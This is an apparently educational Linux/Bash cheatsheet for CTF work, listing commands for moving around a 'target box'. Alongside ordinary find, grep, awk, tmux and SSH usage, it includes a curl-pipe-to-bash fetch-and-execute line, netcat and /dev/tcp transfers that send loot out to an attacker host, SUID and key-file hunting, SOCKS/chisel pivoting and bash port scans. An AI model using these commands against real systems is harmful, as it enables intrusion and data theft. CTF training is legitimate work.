# Linux / Bash Fluency Cheatsheet

> For authorized CTF / educational use. Speed reference for moving fast on a target box.

Placeholders: `$IP` = remote box, `$LHOST` = your IP, `$LPORT` = your port.

---

## 1. Navigation & Files

```bash
pwd ; ls -la ; cd - (jump to previous dir)
ls -laR /path                # recursive
ls -lat                      # newest first (-t time, -r reverse)
tree -L 2 /path              # 2 levels deep
cat -A file                  # show hidden chars (tabs, CRLF)
file mystery ; stat file     # type / timestamps & perms
du -sh * | sort -h           # dir sizes
df -h                        # disk usage
readlink -f file             # resolve absolute path / symlinks
```

---

## 2. find (locate anything)

```bash
find / -name "flag*" 2>/dev/null               # by name (suppress permission errors)
find / -iname "*.conf" 2>/dev/null             # case-insensitive
find / -type f -newer /etc/hostname 2>/dev/null # files modified after a reference
find / -mmin -10 2>/dev/null                    # modified in last 10 min
find / -size +100M 2>/dev/null                  # larger than 100MB
find / -user www-data 2>/dev/null               # owned by user
# Privesc-relevant:
find / -perm -4000 -type f 2>/dev/null          # SUID binaries
find / -perm -2000 -type f 2>/dev/null          # SGID
find / -writable -type d 2>/dev/null            # writable dirs
find / -name "id_rsa" -o -name "*.kdbx" 2>/dev/null
find / -type f -exec grep -l "password" {} \; 2>/dev/null   # files containing string
```

---

## 3. grep / sed / awk One-Liners

### grep
```bash
grep -r "flag{" / 2>/dev/null              # recursive search for flag format
grep -rin "password" /var/www 2>/dev/null  # -i ignore case -n line# -r recursive
grep -E "flag\{.*\}" file                  # extended regex
grep -oP 'flag\{[^}]+\}' file              # -o only match, -P perl regex
grep -v "^#" config | grep -v "^$"         # strip comments + blank lines
grep -A3 -B1 "error" log                   # context: 3 after, 1 before
grep -c "GET" access.log                    # count matches
```

### sed
```bash
sed -n '10,20p' file                        # print lines 10-20
sed 's/foo/bar/g' file                       # substitute all
sed -i 's/old/new/g' file                    # in-place edit
sed '/^#/d' file                             # delete comment lines
sed -n '5p' file                             # print line 5
```

### awk
```bash
awk '{print $1}' file                        # first whitespace field
awk -F: '{print $1}' /etc/passwd             # custom delimiter (:)
awk -F: '$3>=1000 {print $1}' /etc/passwd    # users with UID>=1000
awk '{print $1}' access.log | sort | uniq -c | sort -rn   # top IPs in log
awk '{sum+=$1} END {print sum}' nums         # sum a column
awk 'NR==5'  file                            # print line 5
awk '!seen[$0]++' file                       # dedupe preserving order
```

### combine / sort / uniq
```bash
cut -d, -f2 data.csv                          # field 2 of CSV
sort file | uniq -c | sort -rn               # frequency count
tr ',' '\n' < file                            # split on delimiter
wc -l file                                    # count lines
```

---

## 4. File Transfer (get tools onto / loot off the box)

```bash
# --- HTTP: serve from your box ---
python3 -m http.server 80                     # serve cwd on :80
# on target:
wget http://$LHOST/linpeas.sh -O /tmp/l.sh
curl http://$LHOST/linpeas.sh -o /tmp/l.sh
curl http://$LHOST/x | bash                    # fetch + execute

# --- Upload back to your box ---
# your box:  python3 -m uploadserver   (pip install uploadserver) or:
# your box:  nc -lvnp $LPORT > loot.tar
# target:    nc $LHOST $LPORT < /tmp/loot.tar
# or curl PUT to a webdav/uploadserver

# --- scp / sftp (if you have SSH) ---
scp file user@$IP:/tmp/                        # push
scp user@$IP:/etc/passwd .                     # pull
scp -i key file user@$IP:/tmp/

# --- netcat raw ---
# receiver:  nc -lvnp $LPORT > out.bin
# sender:    nc $LHOST $LPORT < file.bin

# --- bash /dev/tcp (NO nc/wget/curl available) ---
# target downloads from your HTTP server using only bash:
exec 3<>/dev/tcp/$LHOST/80; echo -e "GET /file HTTP/1.0\r\n\r" >&3; cat <&3

# --- base64 copy/paste (when only a shell, no network) ---
# source:  base64 -w0 file ; (copy output)
# dest:    echo 'BASE64STRING' | base64 -d > file
```

---

## 5. tmux Quick Reference

Prefix = `Ctrl+b` (press, release, then the key).

```
tmux new -s ctf            # new named session
tmux a -t ctf              # attach
tmux ls                    # list sessions

# --- inside tmux (after prefix) ---
c        new window            ,   rename window
n / p    next / prev window    0-9 jump to window #
%        split vertical        "   split horizontal
arrows   move between panes    z   zoom/unzoom pane
x        kill pane             &   kill window
d        detach (session keeps running)
[        scroll/copy mode (q to exit; PgUp/PgDn)
:        command prompt
```

---

## 6. SSH & Tunneling / Port Forwarding

```bash
ssh user@$IP                              # basic
ssh -i key user@$IP                       # key auth (chmod 600 key first)
ssh user@$IP -p 2222                       # custom port
ssh -o StrictHostKeyChecking=no user@$IP

# --- LOCAL forward: reach a remote service via your localhost ---
ssh -L 8080:127.0.0.1:80 user@$IP          # your :8080 -> target's :80
#   then browse http://127.0.0.1:8080

# --- REMOTE forward: expose YOUR service to the remote box ---
ssh -R 8000:127.0.0.1:8000 user@$IP        # target's :8000 -> your :8000

# --- DYNAMIC (SOCKS proxy): pivot through the box into its network ---
ssh -D 1080 user@$IP                        # SOCKS5 on your :1080
#   use with: proxychains nmap -sT 172.16.0.0/24   (set socks5 127.0.0.1 1080 in /etc/proxychains.conf)

# --- ProxyJump: hop through a bastion ---
ssh -J user@bastion user@internal-host
ssh -o ProxyJump=user@bastion user@internal-host

# Flags: -N no shell (tunnel only), -f background, -g allow remote hosts to use forward
ssh -fN -L 8080:127.0.0.1:80 user@$IP

# No SSH? use chisel for tunneling:
# your box:  ./chisel server -p 8000 --reverse
# target:    ./chisel client $LHOST:8000 R:1080:socks
```

---

## 7. Process & Network Inspection

```bash
# Processes
ps aux                          # all processes
ps auxf                         # tree view
ps -ef | grep ssh
top / htop                      # live
pstree -p
pspy64                          # watch cron + processes WITHOUT root (great for privesc)
kill -9 <pid> ; pkill name

# Network
ss -tulnp                       # listening TCP/UDP + process (modern netstat)
ss -tnp                         # established TCP connections
netstat -tulnp                  # older systems
lsof -i :80                     # what's using port 80
lsof -p <pid>                   # files opened by process
ip a ; ip route ; ip neigh      # interfaces / routes / arp
arp -a
cat /etc/resolv.conf            # DNS servers
curl ifconfig.me                # public IP

# System / users
id ; whoami ; sudo -l
cat /etc/passwd ; cat /etc/group
w ; last ; who                  # logged-in users
uname -a ; cat /etc/os-release  # kernel / distro
crontab -l ; cat /etc/crontab ; ls -la /etc/cron.*
env ; cat ~/.bash_history
```

---

## 8. Regex Quick Reference

```
.        any char              \d  digit        \w  word char [A-Za-z0-9_]
*        0 or more             \s  whitespace   \b  word boundary
+        1 or more             \D \W \S  negations
?        0 or 1 (lazy w/ *?)   ^   start of line
{2,5}    2 to 5 repeats        $   end of line
[abc]    char class            |   alternation (a|b)
[^abc]   negated class         ()  capture group
[a-z]    range                 \   escape special char

# Common CTF patterns
flag\{[^}]+\}                   # flag{...}
[0-9]{1,3}(\.[0-9]{1,3}){3}     # IPv4
[a-fA-F0-9]{32}                 # MD5 hash
[\w.+-]+@[\w-]+\.[\w.-]+         # email
([A-Za-z0-9+/]{4})*([A-Za-z0-9+/]{2,3}={0,2})  # base64
# Use with grep -P (perl) or -E (extended)
grep -oP 'flag\{[^}]+\}' file
```

---

## 9. Bash Speed Tricks

```bash
!!              # repeat last command         sudo !!     # rerun last as root
!$              # last arg of previous cmd
^old^new        # rerun last cmd, replacing old with new
Ctrl+r          # reverse search history
cd -            # toggle to previous dir
for i in {1..254}; do (ping -c1 -W1 10.10.10.$i >/dev/null && echo "10.10.10.$i up" &); done   # ping sweep
for p in $(seq 1 1000); do (echo >/dev/tcp/$IP/$p) 2>/dev/null && echo "port $p open"; done    # pure-bash port scan
watch -n1 'ss -tnp'                  # refresh a command every 1s
timeout 5 ./binary                   # cap runtime
mkdir -p a/b/c                        # create nested dirs
```

See also: `ctf-master-cheatsheet.md`, `reverse-shells.md`.
